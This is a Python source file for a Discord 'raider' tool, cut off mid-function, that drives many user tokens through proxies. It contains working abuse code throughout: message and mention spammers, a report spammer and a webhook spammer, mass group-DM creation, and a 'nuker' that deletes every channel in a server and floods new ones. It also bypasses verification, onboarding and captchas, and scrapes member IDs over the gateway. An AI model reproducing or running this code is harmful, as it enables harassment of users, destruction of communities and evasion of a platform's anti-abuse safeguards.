IF YOU REALLY WANT TO ACTIVATE IT, REMOVE THIS STRING.
import os
import threading
import random
import colorama
from colorama import *
import re
import requests
from datetime import *
import ctypes
from Crypto.Cipher import AES
import concurrent.futures
import discord
from discord.ext import commands
from discord.voice_client import VoiceClient
from mutagen.mp3 import MP3
import time
import asyncio
import json
import base64
import tls_client
import websocket
import hwid as hardid
import hashlib
import sys
import uuid
import wmi
import urllib3
from ctypes import *
import sqlite3
import subprocess
from sys import executable
import os,threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads,load
from ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer
from urllib.request import Request,urlopen
from json import*
import time,shutil
from zipfile import ZipFile
import random,logging,re,subprocess,socket,datetime,requests
from Crypto.Cipher import AES
from pathlib import Path
import winreg,psutil,wmi,uuid,os,threading,random,colorama,re,requests
from datetime import*
import ctypes
from Crypto.Cipher import AES
import hashlib,concurrent.futures,discord
import time,asyncio
import colorama
from colorama import Fore,Back,Style
from uuid import getnode as get_mac
import json

colorama.init()

tokens = open("tokens.txt","r").read().splitlines()
proxys = open("proxys.txt","r").read().splitlines()
settings = json.load(open('config.json', 'r'))
token_format = settings["token_format"]

session = tls_client.Session(client_identifier="chrome_122",random_tls_extension_order=True)
if proxys:
    session.proxies = {"http":random.choice(proxys),"https":random.choice(proxys)}

class Member:

    @staticmethod
    def rangeCorrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges

    @staticmethod
    def getRanges(index, multiplier, memberCount):
        initialNum = int(index * multiplier)
        rangesList = [[initialNum, initialNum + 99]]
        if memberCount > initialNum + 99:
            rangesList.append([initialNum + 100, initialNum + 199])
        return Member.rangeCorrector(rangesList)

    @staticmethod
    def parseGuildMemberListUpdate(response):
        memberdata = {
            "online_count": response["d"]["online_count"],
            "member_count": response["d"]["member_count"],
            "id": response["d"]["id"],
            "guild_id": response["d"]["guild_id"],
            "hoisted_roles": response["d"]["groups"],
            "types": [],
            "locations": [],
            "updates": [],
        }

        for chunk in response["d"]["ops"]:
            memberdata["types"].append(chunk["op"])
            if chunk["op"] in ("SYNC", "INVALIDATE"):
                memberdata["locations"].append(chunk["range"])
                if chunk["op"] == "SYNC":
                    memberdata["updates"].append(chunk["items"])
                else:
                    memberdata["updates"].append([])
            elif chunk["op"] in ("INSERT", "UPDATE", "DELETE"):
                memberdata["locations"].append(chunk["index"])
                if chunk["op"] == "DELETE":
                    memberdata["updates"].append([])
                else:
                    memberdata["updates"].append(chunk["item"])
        return memberdata

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id, botscrape=False):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.botscrape = botscrape
        self.socket_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=self.socket_headers,
            on_open=lambda ws: self.sock_open(ws),
            on_message=lambda ws, message: self.sock_message(ws, message, botscrape),
            on_close=lambda ws, close_code, close_message: self.sock_close(
                ws, close_code, close_message
            ),
        )

        self.endScraping = False
        self.guilds = {}
        self.members = {}
        self.ranges = [[0, 0]]
        self.lastRange = 0
        self.packets_recv = 0

    def run(self):
        self.run_forever()
        return self.members

    def scrapeUsers(self):
        if not self.endScraping:
            self.send(
                '{"op":14,"d":{"guild_id":"'
                + self.guild_id
                + '","typing":true,"activities":true,"threads":true,"channels":{"'
                + self.channel_id
                + '":'
                + json.dumps(self.ranges)
                + "}}}"
            )

    def sock_open(self, ws):
        self.send(
            '{"op":2,"d":{"token":"'
            + self.token
            + '","capabilities":125,"properties":{"os":"Windows NT","browser":"Chrome","device":"","system_locale":"it-IT","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","browser_version":"119.0","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":103981,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}'
        )

    def heartbeatThread(self, interval):
        try:
            while True:
                self.send('{"op":1,"d":' + str(self.packets_recv) + "}")
                time.sleep(interval)
        except Exception as e:
            pass

    def sock_message(self, ws, message, botscraper=False):
        decoded = json.loads(message)
        if decoded is None:
            return
        if decoded["op"] != 11:
            self.packets_recv += 1
        if decoded["op"] == 10:
            threading.Thread(
                target=self.heartbeatThread,
                args=(decoded["d"]["heartbeat_interval"] / 1000,),
                daemon=True,
            ).start()
        if decoded["t"] == "READY":
            for guild in decoded["d"]["guilds"]:
                self.guilds[guild["id"]] = {"member_count": guild["member_count"]}
        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Member.getRanges(
                0, 100, self.guilds[self.guild_id]["member_count"]
            )
            self.scrapeUsers()
        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Member.parseGuildMemberListUpdate(decoded)

            if parsed["guild_id"] == self.guild_id and (
                "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]
            ):
                for elem, index in enumerate(parsed["types"]):
                    if index == "SYNC":
                        if len(parsed["updates"][elem]) == 0:
                            self.endScraping = True
                            break

                        for item in parsed["updates"][elem]:
                            if "member" in item:
                                mem = item["member"]
                                obj = {
                                    "tag": mem["user"]["username"]
                                    + "#"
                                    + mem["user"]["discriminator"],
                                    "id": mem["user"]["id"],
                                }
                                if botscraper == False:
                                    if not mem["user"].get("bot"):
                                        self.members[mem["user"]["id"]] = obj
                                else:
                                    self.members[mem["user"]["id"]] = obj

                    elif index == "UPDATE":
                        for item in parsed["updates"][elem]:
                            if "member" in item:
                                mem = item["member"]
                                obj = {
                                    "tag": mem["user"]["username"]
                                    + "#"
                                    + mem["user"]["discriminator"],
                                    "id": mem["user"]["id"],
                                }
                                if botscraper == False:
                                    if not mem["user"].get("bot"):
                                        self.members[mem["user"]["id"]] = obj
                                else:
                                    self.members[mem["user"]["id"]] = obj

                    self.lastRange += 1
                    self.ranges = Member.getRanges(
                        self.lastRange, 100, self.guilds[self.guild_id]["member_count"]
                    )
                    time.sleep(0.45)
                    self.scrapeUsers()

            if self.endScraping:
                self.close()

    def sock_close(self, ws, close_code, close_message):
        pass


class WebSocketClient:
    def __init__(self, token):
        self.token = token
        self.ws = websocket.WebSocketApp("wss://gateway.discord.gg/?v=9&encoding=json")

    def connect(self):
        self.ws.on_open = self.on_open
        self.ws.run_forever()

    def on_open(self, ws):
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {
                    "$os": "windows",
                    "$browser": "mybot",
                    "$device": "mybot",
                },
            },
        }
        ws.send(json.dumps(payload))

class Raider:

    @classmethod
    def get_cookie(cls):
        headers = {
            "accept" : "*/*",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language":"ja,en-US;q=0.9,en;q=0.8",
            "Alt-Used":"discord.com",
            "Connection":"keep-alive",
            "Host":"discord.com",
            "Origin":"https://discord.com",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "X-Super-Properties":"eyJvcyI6ICJXaW5kb3dzIiwgImJyb3dzZXIiOiAiRGlzY29yZCBDbGllbnQiLCAicmVsZWFzZV9jaGFubmVsIjogInN0YWJsZSIsICJjbGllbnRfdmVyc2lvbiI6ICIxLjAuOTAyMyIsICJvc192ZXJzaW9uIjogIjEwLjAuMTkwNDUiLCAib3NfYXJjaCI6ICJ4NjQiLCAiYXBwX2FyY2giOiAiaWEzMiIsICJzeXN0ZW1fbG9jYWxlIjogImVuIiwgImJyb3dzZXJfdXNlcl9hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuOTAyMyBDaHJvbWUvMTA4LjAuNTM1OS4yMTUgRWxlY3Ryb24vMjIuMy4yNiBTYWZhcmkvNTM3LjM2IiwgImJyb3dzZXJfdmVyc2lvbiI6ICIyMi4zLjI2IiwgImNsaWVudF9idWlsZF9udW1iZXIiOiAyNDQzNTgsICJuYXRpdmVfYnVpbGRfbnVtYmVyIjogMzkzMzQsICJjbGllbnRfZXZlbnRfc291cmNlIjogbnVsbCwgImRlc2lnbl9pZCI6IDB9",
            }
        r = session.get('https://discord.com/app', headers=headers)
        return r.cookies

    @classmethod
    def set_headers(cls, token):
        headers= {
            "Authorization": token,
            "accept": "*/*",
            "accept-language": "ja-JP",
            "connection": "keep-alive",
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE": "Trailers",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6ICJXaW5kb3dzIiwgImJyb3dzZXIiOiAiRGlzY29yZCBDbGllbnQiLCAicmVsZWFzZV9jaGFubmVsIjogInN0YWJsZSIsICJjbGllbnRfdmVyc2lvbiI6ICIxLjAuOTAyMyIsICJvc192ZXJzaW9uIjogIjEwLjAuMTkwNDUiLCAib3NfYXJjaCI6ICJ4NjQiLCAiYXBwX2FyY2giOiAiaWEzMiIsICJzeXN0ZW1fbG9jYWxlIjogImVuIiwgImJyb3dzZXJfdXNlcl9hZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXT1c2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgZGlzY29yZC8xLjAuOTAyMyBDaHJvbWUvMTA4LjAuNTM1OS4yMTUgRWxlY3Ryb24vMjIuMy4yNiBTYWZhcmkvNTM3LjM2IiwgImJyb3dzZXJfdmVyc2lvbiI6ICIyMi4zLjI2IiwgImNsaWVudF9idWlsZF9udW1iZXIiOiAyNDQzNTgsICJuYXRpdmVfYnVpbGRfbnVtYmVyIjogMzkzMzQsICJjbGllbnRfZXZlbnRfc291cmNlIjogbnVsbCwgImRlc2lnbl9pZCI6IDB9",
        }
        return headers

    @classmethod
    def log(cls, color, message=None, token=None, option=None, error=False):
        time = datetime.now().strftime("%H:%M:%S")
        err_msg = None
        if message:
            if color == "success":
                text = f"\033[38;2;75;255;126m{message}{Style.RESET_ALL}"
            elif color == "error":
                text = f"\033[38;2;255;84;91m{message}{Style.RESET_ALL}"
            elif color == "warn":
                text = f"\033[38;2;255;247;89m{message}{Style.RESET_ALL}"
            elif color == "info":
                text = f"\033[38;2;67;197;255m{message}{Style.RESET_ALL}"
        if error == True:
            text = f"\033[38;2;255;84;91mERROR{Style.RESET_ALL}"
            err_msg = message

        if token and token_format == True:
            token = token.split('.')[0]
            token = token[:-4] + f'\033[38;2;176;176;176m*{Style.RESET_ALL}' * 4

        log = f"                    [\033[38;2;176;176;176m{time}{Style.RESET_ALL}] "+ (f"[{text}] " if text else " ") + (f"{err_msg} " if err_msg else "") + (f"{token}" if token else "") + (f"\033[38;2;176;176;176m ({option}){Style.RESET_ALL}" if option else "")
        print(log)

    @classmethod
    def rand_str(cls, x, y=False):
        if y:
            randoms = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
        else:
            randoms = "abcdefghijklmnopqrstuvwxyz1234567890"
        return "".join(random.choice(randoms) for i in range(x))

    @classmethod
    def rand_emoji(cls):
        emojis = ["😀", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉" "💩", "🤡", "👹", "👺", "😾"]
        return ''.join(random.choice(emojis) for _ in range(1))

    @classmethod
    def captcha_bypass(cls, site_key, rqdata):
        apikey = json.load(open('config.json', 'r'))["capmon_api_key"]
        json_data = {
            "clientKey": apikey,
            "task": {
                "type": "HCaptchaTaskProxyless",
                "websiteURL": "https://discord.com",
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
                "websiteKey": site_key,
                "data":rqdata
            }
        }
        with requests.post("https://api.capmonster.cloud/createTask", json=json_data) as r:
            task_id = r.json().get("taskId")
        json_data = {
            "clientKey": apikey,
            "taskId": task_id
        }
        while True:
            with requests.get("https://api.capmonster.cloud/getTaskResult", json=json_data) as r:
                if "processing" in r.text:
                    pass
                else:
                    try:
                        return r.json()["solution"]["gRecaptchaResponse"]
                    except:
                        cls.log("error", "このタイプの CAPTCHA はサービスでサポートされていません。", token=None, error=True)
                        return None

    @classmethod
    def sender(cls, token, basemessage, channels, delay, mention_length=None, members=None, randstring=None, emojis=None, cmds=None, messages=None):
        try:
            headers = cls.set_headers(token)
            while True: 
                if messages:
                    basemessage = random.choice(messages)
                    message = f"{basemessage}\n"
                else:
                    message = f"{basemessage}\n"
                if cmds:
                    cmd = random.choice(cmds)
                    message = f"{cmd}\n{basemessage}\n"
                if mention_length and members:
                    mentions = random.sample(members, int(mention_length))
                    mention = ''.join(mentions)
                    message += f"{mention}"
                if randstring:
                    randstring = cls.rand_str(5)
                    message += f"{randstring}"
                if emojis:
                    randemojis = cls.rand_emoji()
                    message += f"{randemojis}"
                channel = random.choice(channels)
                payload = {"content": message}
                r = session.post(f"https://discord.com/api/v9/channels/{channel}/messages", json=payload, headers=headers)
                if r.status_code == 200:
                    cls.log("success", "SENT", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                else:
                    cls.log("error", "ERROR", token)
                time.sleep(int(float(delay)))
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def rply_sender(cls, token, guild, channel, message_id, delay, basemessage, mention_length=None, members=None, randstring=None, emojis=None, messages=None):
        while True:
            headers = cls.set_headers(token)
            try:
                if messages:
                    basemessage = random.choice(messages)
                    message = f"{basemessage}\n"
                else:
                    message = f"{basemessage}\n"
                if mention_length and members:
                    mentions = random.sample(members, int(mention_length))
                    mention = ''.join(mentions)
                    message += f"{mention}"
                if randstring:
                    randstring = cls.rand_str(5)
                    message += f"{randstring}"
                if emojis:
                    emojis = cls.rand_emoji()
                    message += f"{emojis}"
                payload = {"mobile_network_type":"unknown","content":message,"nonce":None,"message_reference":{"guild_id":guild,"channel_id":channel,"message_id":message_id},"flags":0}
                r = session.post(f"https://discord.com/api/v9/channels/{channel}/messages", json=payload, headers=headers)
                if r.status_code == 200:
                    cls.log("success", "SENT", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                else:
                    cls.log("error", "ERROR", token)
                time.sleep(int(float(delay)))
            except Exception as e:
                cls.log("error", str(e), token, error=True)

    @classmethod
    def thread_creator(cls, token, channel, name):
        try:
            headers = cls.set_headers(token)
            payload = {"name": str(name), "type": 11, "auto_archive_duration": 4320, "location": "Thread Browser Toolbar"}
            r = requests.post(f"https://discord.com/api/v9/channels/{channel}/threads", json=payload, headers=headers)
            if r.status_code == 201:
                cls.log("success", "CREATE", token)
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
            elif r.status_code == 403:
                cls.log("error", "NOT ACCESS", token)
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def reaction_adder(cls, token, channel, message, emoji):
        try:
            headers = cls.set_headers(token)
            r = session.put(f"https://discord.com/api/v9/channels/{channel}/messages/{message}/reactions/{emoji}/%40me?location=Message&type=0", headers=headers)
            if r.status_code == 204:
                cls.log("success", "SUCCESS", token)
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
            elif r.status_code == 403:
                cls.log("error", "NOT ACCESS", token)
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def reaction_remover(cls, token, channel, message, emoji):
        try:
            headers = cls.set_headers(token)
            r = session.delete(f"https://discord.com/api/v9/channels/{channel}/messages/{message}/reactions/{emoji}/%40me?location=Message&type=0", headers=headers)
            if r.status_code == 204:
                cls.log("success", "SUCCESS", token)
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
            elif r.status_code == 403:
                cls.log("error", "NOT ACCESS", token)
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)


    @classmethod
    def btn_clicker(cls, token, guild, channel, message, amount, payload=False):
        try:
            headers = cls.set_headers(token)
            r = session.get(f"https://discord.com/api/v9/channels/{channel}/messages?limit=1&around={message}", headers=headers)
            applicationid = r.json()[0]["author"]["id"]
            customid = r.json()[0]["components"][0]["components"][0]["custom_id"]
            sessionid = cls.rand_str(16)
            for i in range(int(amount)):
                if payload:
                    data = payload
                else:
                    data = {"type": 3, "guild_id": guild, "channel_id": channel, "message_flags": 0, "message_id": message, "application_id": applicationid, "session_id": sessionid, "data": {"component_type": 2, "custom_id": customid}}
                r = session.post("https://discord.com/api/v9/interactions", headers=headers, json=data)
                if r.status_code == 204:
                    cls.log("success", "CLICK", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                else:
                    cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def grp_creator(cls, token, name, channel, users):
        while True:
            try:
                with open("data\\group_icon.png", "rb") as f:
                    icon = f.read()
                headers = cls.set_headers(token)
                r = requests.put(f"https://discord.com/api/v9/channels/{channel}/recipients/{users[0]}", headers=headers)
                if r.status_code == 201:
                    cls.log("success", "CREATE", token)
                    groupid = r.json()["id"]
                    payload = {"name": name, "icon": f"data:image/png;base64,{(base64.b64encode(icon).decode('utf-8'))}"}
                    r = requests.patch(f"https://discord.com/api/v9/channels/{groupid}", headers=headers, json=payload)
                    for userid in users:
                        if not userid == users[0]:
                            r = requests.put(f"https://discord.com/api/v9/channels/{groupid}/recipients/{userid}", headers=headers)
                    r = requests.delete(f"https://discord.com/api/v9/channels/{groupid}?silent=true", headers=headers)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    time.sleep(int(r.json()['retry_after']))
                else:
                    cls.log("error", "ERROR", token)
            except Exception as e:
                cls.log("error", str(e), token, error=True)

    @classmethod
    def report_spammer(cls, token, channel, message, reason):
        while True:
            try:
                breadcrumbs = {"1": [3, 46], "2": [3, 24, 49], "3": [3, 24, 50], "4": [3, 24, 36, 63], "5": [3, 24, 51], "6": [3, 29, 68, 107], "7": [3, 29, 68, 104], "8": [3, 29, 39, 74], "9": [3, 29, 73], "10": [3, 29, 70]}
                payload = {"version": "1.0", "variant": "4", "language": "en", "breadcrumbs": breadcrumbs[reason], "elements": {}, "channel_id": channel, "message_id": message, "name": "message"}
                headers = cls.set_headers(token)
                r = session.post("https://discord.com/api/v9/reporting/message", json=payload, headers=headers)
                if r.status_code == 201:
                    cls.log("success", "SENT", token)
                elif r.status_code == 401:
                    cls.log("error", "DEAD", token)
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS", token)
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                else:
                    cls.log("error", "ERROR", token)
            except Exception as e:
                cls.log("error", str(e), token, error=True)

    @classmethod
    def webhook_spammer(cls, url, message, delay, tts, name, avatar):
        while True:
            try:
                payload = {"content": message, "tts": tts, "username": name, "avatar_url": avatar}
                r = session.post(url, json=payload)
                if r.status_code == 204:
                    cls.log("success", "SENT")
                elif r.status_code == 403:
                    cls.log("error", "NOT ACCESS")
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", option=f"{r.json()['retry_after']}s")
                else:
                    cls.log("error", "ERROR")
                time.sleep(int(float(delay)))
            except Exception as e:
                cls.log("error", str(e), error=True)

    @classmethod
    def onboard_bypass(cls, token, guild, headers):
        try:
            headers = cls.set_headers(token)
            r = session.get(f"https://discord.com/api/v9/guilds/{guild}/onboarding", headers=headers)
            data = r.json()
            now = int(datetime.now().timestamp())
            onboarding_responses = []
            prompts_seen = {}
            responses_seen = {}
            for prompt in data["prompts"]:
                onboarding_responses.append(prompt["options"][-1]["id"])
                prompts_seen[prompt["id"]] = now
                for prompt_option in prompt["options"]:
                    if prompt_option:
                        responses_seen[prompt_option["id"]] = now
            payload = {"onboarding_responses": responses_seen, "onboarding_prompts_seen": prompts_seen, "onboarding_responses_seen": responses_seen}
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/onboarding-responses", json=payload, headers=headers)
            if r.status_code == 200:
                cls.log("info", "BYPASS", token)
                return
            else:
                cls.log("error", "ERROR", token)
                return
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def verify_bypass(cls, token, guild, headers):
        try:
            headers = cls.set_headers(token)
            payload = session.get(f"https://discord.com/api/v9/guilds/{guild}/member-verification?with_guild=false", headers=headers).json()
            r = session.put(f"https://discord.com/api/v9/guilds/{guild}/requests/@me", headers=headers, json=payload)
            if r.status_code == 201:
                cls.log("info", "BYPASS", token)
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def joiner(cls, token, invite, onboard=False):
        try:
            headers = cls.set_headers(token)
            r = session.post("https://discord.com/api/v9/invites/" + invite, headers=headers, cookies=cls.get_cookie())
            if r.status_code == 200:
                cls.log("success", "JOIN", token)
                guild = r.json()["guild"]["id"]
                if "show_verification_form" in r.json():
                    cls.verify_bypass(token, guild, headers)
                if onboard:
                    cls.onboard_bypass(token, guild, headers)
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
            elif r.status_code == 400:
                if "captcha_key" in r.json():
                    cls.log("warn", "CAPTCHA", token)
                    if settings["capmon_api_key"]:
                        headers["X-Captcha-Key"] = cls.captcha_bypass(f"{r.json()['captcha_sitekey']}", r.json()['captcha_rqdata'])
                        headers["X-Captcha-Rqtoken"] = r.json()['captcha_rqtoken']
                        r = session.post("https://discord.com/api/v9/invites/" + invite, headers=headers, cookies=cls.get_cookie())
                        if r.status_code == 200:
                            cls.log("success", "JOIN", token)
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token)
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def leaver(cls, token, guild):
        try:
            headers = cls.set_headers(token)
            r = session.delete("https://discord.com/api/v9/users/@me/guilds/" + guild, headers=headers)
            if r.status_code in [200, 203, 204]:
                cls.log("success", "LEAVE", token)
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
            elif r.status_code == 400:
                cls.log("error", "DETECT", token)
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token)
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def servers(cls, token):
        try:
            headers = cls.set_headers(token)
            r = session.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
            return r.json()
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return None

    @classmethod
    def server_sender(cls, token, guild, message):
        try:
            headers = cls.set_headers(token)
            channels = cls.get_channels(token, guild)
            if channels:
                payload = {"content": message}
                r = session.post(f"https://discord.com/api/v10/channels/{random.choice(channels)}/messages", json=payload, headers=headers)
                if r.status_code == 200:
                    cls.log("success", "SENT", token, option=guild)
                else:
                    cls.log("error", "ERROR", token, option=guild)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def server_creator(cls, token, name):
        while True:
            try:
                headers = cls.set_headers(token)
                payload = {"name": str(name), "icon": None, "channels": [], "system_channel_id": None, "guild_template_code": "2TffvPucqHkN"}
                r = session.post("https://discord.com/api/v9/guilds", headers=headers, json=payload, cookies=cls.get_cookie())
                if r.status_code == 201:
                    cls.log("success", "CREATE", token)
                    continue
                elif r.status_code == 429:
                    cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    continue
                else:
                    cls.log("error", "ERROR", token)
                    break
            except Exception as e:
                cls.log("error", str(e), token, error=True)
                continue

    @classmethod
    def get_channels(cls, token, guild):
        try:
            channels = []
            headers = cls.set_headers(token)
            r = session.get(f"https://discordapp.com/api/v9/guilds/{guild}/channels", headers=headers)
            if r.status_code == 200:
                for channel in r.json():
                    if 'bitrate' not in channel and channel['type'] == 0:
                        if channel not in channels:
                            channel = channel["id"]
                            r = session.post(f"https://discord.com/api/v9/channels/{channel}/typing", headers=headers)
                            if r.status_code == 204:
                                channels.append(channel)
                return channels
            else:
                return None
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return None

    @classmethod
    def fake_typer(cls, token, channels, typer_time):
        try:
            headers = cls.set_headers(token)
            typer_time = typer_time / 10
            typer_time = round(typer_time)
            for i in range(typer_time):
                for channel in channels:
                    r = session.post(f"https://discord.com/api/v9/channels/{channel}/typing", headers=headers)
                    if r.status_code == 204:
                        cls.log("success", "TYPING", token)
                    elif r.status_code == 401:
                        cls.log("error", "DEAD", token)
                    elif r.status_code == 400:
                        cls.log("error", "DETECT", token)
                    elif r.status_code == 429:
                        cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
                    else:
                        cls.log("error", "ERROR", token)
                time.sleep(10)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def nick_changer(cls, token, guild, nickname):
        try:
            payload = {"nick": str(nickname)}
            headers = cls.set_headers(token)
            r = session.patch(f"https://discord.com/api/v9/guilds/{guild}/members/@me", headers=headers, json=payload)
            if r.status_code == 200:
                cls.log("success", "CHANGE", token)
            elif r.status_code == 401:
                cls.log("error", "DEAD", token)
            elif r.status_code == 403:
                cls.log("error", "NOT ACCESS", token)
            elif r.status_code == 429:
                cls.log("warn", "RATELIMIT", token, option=f"{r.json()['retry_after']}s")
            else:
                cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def nuker(cls, token, guild, channelname, message):
        try:
            headers = cls.set_headers(token)
            r = session.get(f"https://discordapp.com/api/v9/guilds/{guild}/channels", headers=headers)
            if r.status_code == 200:
                channels = r.json()
                for channel in channels:
                    r = session.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
                    if r.status_code == 200:
                        cls.log("success", "DELETE", token, option=channel['id'])
                    else:
                        cls.log("error", "ERROR", token, option=channel['id'])
            for i in range(50):
                payload = {"type": 0, "name": str(channelname), "permission_overwrites": []}
                r = session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=payload)
                if r.status_code == 201:
                    cls.log("success", "CREATE", token, option=r.json()['id'])
                    payload = {"content": str(message)}
                    r = session.post(f"https://discord.com/api/v9/channels/{r.json()['id']}/messages", headers=headers, json=payload)
                    if r.status_code == 200:
                        cls.log("success", "SENT", token, option=r.json()['id'])
                    else:
                        cls.log("error", "ERROR", token, option=r.json()['id'])
                else:
                    cls.log("error", "ERROR", token)
        except Exception as e:
            cls.log("error", str(e), token, error=True)

    @classmethod
    def scrape(cls, token, guild, channel, bot=False):
        sb = DiscordSocket(token, guild, channel, bot)
        return sb.run()

    @classmethod
    def get_member(cls, tokens, guild, channel):
        try:
            in_guild = []
            for token in tokens:
                headers = cls.set_headers(token)
                r = session.get(f"https://discord.com/api/v9/guilds/{guild}", headers=headers)
                if r.status_code == 200:
                    in_guild.append(token)
                    break
            if not in_guild:
                cls.log("error", "Missing access", token)
            token = random.choice(in_guild)
            data = cls.scrape(token, guild, channel)
            members = [f"<@{member_id}>" for member_id in [int(member_id) for member_id in data.keys()]]
            cls.log("info", "INFO", token, option=f"{len(members)} Scraped Members")
            return members
        except Exception as e:
            cls.log("error", str(e), token, error=True)
            return []

    @classmethod
    def get_member_id(cls, tokens, guild, channel, bot=False):
        try:
            headers = cls.set_headers(tokens)
            in_guild = []
            for token in tokens:
                headers = cls.set_headers(token)
                r = session.get(f"https://discord.com/api/v9/guilds/{guild}", headers=headers)
                if r.status_code == 200:
                    in_guild.append(token)
                    break
            if not in_guild:
                cls.log("error", "Missing access", tokens[0])
                return []
            token = random.choice(in_guild)
            data = cls.scrape(token, guild, channel, bot)
            members = list(data.keys())
